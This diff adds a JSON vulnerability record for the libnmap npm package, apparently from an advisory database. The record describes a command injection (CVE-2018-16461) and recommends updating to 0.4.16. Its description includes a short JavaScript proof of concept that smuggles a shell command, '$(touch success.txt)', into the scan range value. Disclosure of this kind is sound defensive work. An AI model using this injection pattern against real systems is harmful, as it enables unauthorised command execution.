@@ -1,0 +1,33 @@
+{
+  "packageName": "libnmap",
+  "lastUpdated": "2026-05-04T13:06:56.926Z",
+  "vulnerabilities": [
+    {
+      "id": "GHSA-7g2w-6r25-2j7p",
+      "packageName": "libnmap",
+      "title": "Command Injection in libnmap",
+      "description": "Versions of `libnmap` before 0.4.16 are vulnerable to command injection. \n\nProof of concept\n\n```js\nconst nmap = require('libnmap');\nconst opts = {\n    range: [\n        'scanme.nmap.org',\n        \"x.x.$(touch success.txt)\"\n    ]\n};\nnmap.scan(opts, function(err, report) {\n    if (err) throw new Error(err);\n\n    for (let item in report) {\n        console.log(JSON.stringify(report[item]));\n    }\n});\n```\n\n\n## Recommendation\n\nUpdate to version 0.4.16 or later",
+      "severity": "medium",
+      "url": "https://github.com/advisories/GHSA-7g2w-6r25-2j7p",
+      "publishedAt": "2018-11-01T14:51:33Z",
+      "modifiedAt": "2023-09-07T18:15:42Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-7g2w-6r25-2j7p"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2018-16461"
+        }
+      ],
+      "affectedVersions": [
+        {
+          "range": "< 0.4.16",
+          "fixed": "0.4.16"
+        }
+      ],
+      "source": "github"
+    }
+  ]
+}
